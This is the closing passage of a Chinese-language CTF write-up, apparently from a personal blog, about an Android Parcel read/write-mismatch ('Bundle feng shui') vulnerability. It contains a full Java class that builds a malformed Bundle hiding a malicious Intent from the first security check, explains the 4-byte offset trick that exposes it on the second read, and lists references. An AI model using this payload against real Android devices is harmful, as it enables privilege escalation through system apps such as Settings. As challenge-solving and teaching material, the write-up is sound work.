+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">expVulnParcel</span> <span style="color:#8be9fd;font-style:italic">implements</span> IGenerateMalformedParcel{
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">int</span> VAL_PARCELABLE <span style="color:#ff79c6">=</span> 4;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">int</span> VAL_INTEGER <span style="color:#ff79c6">=</span> 1;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">int</span> VAL_BYTEARRAY <span style="color:#ff79c6">=</span> 13;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> Parcel <span style="color:#50fa7b">generate</span>(Intent intent) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//Bundle bundle = new Bundle();</span>
+</span></span><span style="display:flex;"><span>        Parcel obtain <span style="color:#ff79c6">=</span> Parcel.<span style="color:#50fa7b">obtain</span>();
+</span></span><span style="display:flex;"><span>        Parcel obtain2 <span style="color:#ff79c6">=</span> Parcel.<span style="color:#50fa7b">obtain</span>();
+</span></span><span style="display:flex;"><span>        Parcel obtain3 <span style="color:#ff79c6">=</span> Parcel.<span style="color:#50fa7b">obtain</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 准备工作，参考launchAnyWhere写的</span>
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInterfaceToken</span>(<span style="color:#f1fa8c">&#34;android.accounts.IAccountAuthenticatorResponse&#34;</span>); <span style="color:#6272a4">// 相当于3次writeInt</span>
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInt</span>(1);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// obtain的最外层是一个Bundle，Bundle中包含攻击payload</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> bundleLenPos <span style="color:#ff79c6">=</span> obtain.<span style="color:#50fa7b">dataPosition</span>();
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInt</span>(<span style="color:#ff79c6">-</span>1);
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInt</span>(0x4c444E42);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(3); <span style="color:#6272a4">// Bundle的键值对数目</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 1. 依次构造Bundle中的三个键值对</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeString</span>(<span style="color:#f1fa8c">&#34;launchanywhere&#34;</span>); <span style="color:#6272a4">// key string 1 (android.os.VulnParcelable的键值对)</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(VAL_PARCELABLE);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeString</span>(<span style="color:#f1fa8c">&#34;android.os.VulnParcelable&#34;</span>);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(1); <span style="color:#6272a4">// opt</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0); <span style="color:#6272a4">// o2 </span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0); <span style="color:#6272a4">// size</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 长度为13的string实际上会占用28字节</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(13); <span style="color:#6272a4">// key string 2</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(3); <span style="color:#6272a4">// new key string 2</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(13); <span style="color:#6272a4">// new value 2: VAL_BYTEARRAY (刚好覆盖到&#34;intent&#34;前的位置)</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(56); <span style="color:#6272a4">// size</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(1); <span style="color:#6272a4">// value 2: VAL_INTEGER</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(1); <span style="color:#6272a4">// int</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(13); <span style="color:#6272a4">// key string 3</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(22);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(13); <span style="color:#6272a4">// value 3: VAL_BYTEARRAY</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(<span style="color:#ff79c6">-</span>1); <span style="color:#6272a4">// size域占位，在这个ByteArray里藏了一个intent的键值对；第一次读看不到，第二次读会露出来</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 2. 隐藏的恶意intent的键值对</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> dataPosition <span style="color:#ff79c6">=</span> obtain2.<span style="color:#50fa7b">dataPosition</span>();
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeString</span>(<span style="color:#f1fa8c">&#34;intent&#34;</span>); <span style="color:#6272a4">// new key string 3</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(VAL_PARCELABLE); <span style="color:#6272a4">// new value 3</span>
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeString</span>(<span style="color:#f1fa8c">&#34;android.content.Intent&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// obtain3用于存储想要launch的intent的序列化数据</span>
+</span></span><span style="display:flex;"><span>        intent.<span style="color:#50fa7b">writeToParcel</span>(obtain3, 0);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">appendFrom</span>(obtain3, 0, obtain3.<span style="color:#50fa7b">dataSize</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 设置ByteArray的size域</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> dataPosition2 <span style="color:#ff79c6">=</span> obtain2.<span style="color:#50fa7b">dataPosition</span>();
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">setDataPosition</span>(dataPosition <span style="color:#ff79c6">-</span> 4);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">writeInt</span>(dataPosition2 <span style="color:#ff79c6">-</span> dataPosition);
+</span></span><span style="display:flex;"><span>        obtain2.<span style="color:#50fa7b">setDataPosition</span>(dataPosition2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 3. 设置obtain也即Bundle的size域，然后把obtain2中的键值对们加进去</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> dataSize <span style="color:#ff79c6">=</span> obtain2.<span style="color:#50fa7b">dataSize</span>();
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">setDataPosition</span>(bundleLenPos); <span style="color:#6272a4">// 不再是0了</span>
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInt</span>(dataSize);
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">writeInt</span>(0x4c444E42); 
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">appendFrom</span>(obtain2, 0, dataSize);
+</span></span><span style="display:flex;"><span>        obtain.<span style="color:#50fa7b">setDataPosition</span>(0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> obtain;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在第一次反序列化Parcel读数据、检查安全问题的过程中，系统看到的Bundle数据包含以下三个键值对：</p>
+<ul>
+<li>key为&quot;launchanywhere&quot;；value为一个<code>VulnParcelable</code>对象。</li>
+<li>key为长度为13的一个字符串(28 bytes)；value为一个<code>Int</code>对象。</li>
+<li>key为长度为13的一个字符串(28 bytes)；value为一个<code>ByteArray</code>对象，该<code>ByteArray</code>会把恶意intent数据包含住，因此其长度需要在填充完后续payload后再设置。</li>
+</ul>
+<p>在第二次反序列化Parcel读数据、进行启动intent等操作时，由于前面一次读写导致Parcel内容出现4字节偏移，系统看到的Bundle数据会发生变化，其包含以下三个键值对（此时不再有安全性检查）：</p>
+<ul>
+<li>key为&quot;launchanywhere&quot;；value为一个<code>VulnParcelable</code>对象。</li>
+<li>key为长度为3的一个字符串(8bytes)；value为一个长度为56字节的<code>ByteArray</code>对象，其后紧跟着名为&quot;intent&quot;的键。</li>
+<li>key为&quot;intent&quot;；value为一个<code>android.content.Intent</code>对象，此时暴露出来就不会被安全性检查发现。（<strong>攻击者的核心payload</strong>）</li>
+</ul>
+<p>通过构造这样形式的恶意Parcel数据，结合launchAnyWhere的触发场景，就能够以Settings App的权限读取题目flag了。</p>
+<h2 id="小结">小结</h2>
+<ul>
+<li>解题时，多搜集相关漏洞类型的CVE及其利用代码。</li>
+<li>理解漏洞原理时，多看AOSP相关源码，如<code>Parcel.java</code>。</li>
+<li>后续可以学习一下新版本Android系统中针对Parcel序列化新引入的安全机制。</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://blog.csdn.net/jdsjlzx/article/details/109064067"  target="_blank" rel="noopener" >Android中Parcelable的原理和使用方法</a></li>
+<li><a href="https://xz.aliyun.com/t/2364"  target="_blank" rel="noopener" >Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li>
+<li><a href="https://mp.weixin.qq.com/s/62qTWxvRzWpKyZl58nj7Gg"  target="_blank" rel="noopener" >[OPPO安珀实验室] Parcelable和Bundle的爱恨情仇——读写不匹配</a></li>
+<li><a href="https://github.com/michalbednarski/ReparcelBug2"  target="_blank" rel="noopener" >[Github] ReparcelBug2</a></li>
+<li><a href="https://cs.android.com/android/platform/superproject/main/&#43;/main:cts/hostsidetests/securitybulletin/test-apps/launchanywhere/src/com/android/security/cts/launchanywhere/"  target="_blank" rel="noopener" >[Official] launchAnyWhere</a></li>
+<li><a href="https://cs.android.com/android/platform/superproject/main/&#43;/main:cts/hostsidetests/securitybulletin/test-apps/CVE-2021-0921/"  target="_blank" rel="noopener" >[Official] CVE-2021-0921</a></li>
+<li><a href="https://evilpan.com/2023/02/18/parcel-bugs/"  target="_blank" rel="noopener" >Android 反序列化漏洞攻防史话</a></li>
+<li><a href="https://mp.weixin.qq.com/s/Mg3ayNYg4bNbxaNcu8OHIA"  target="_blank" rel="noopener" >赛题解析 | “对抗研判 AVSS挑战赛 ”线上选拔赛</a></li>
+</ul>
+
+    </article>
+  </div>
+
+</div>
+
+
+  
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-PROPERTY_ID', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+</body>
+
+</html>
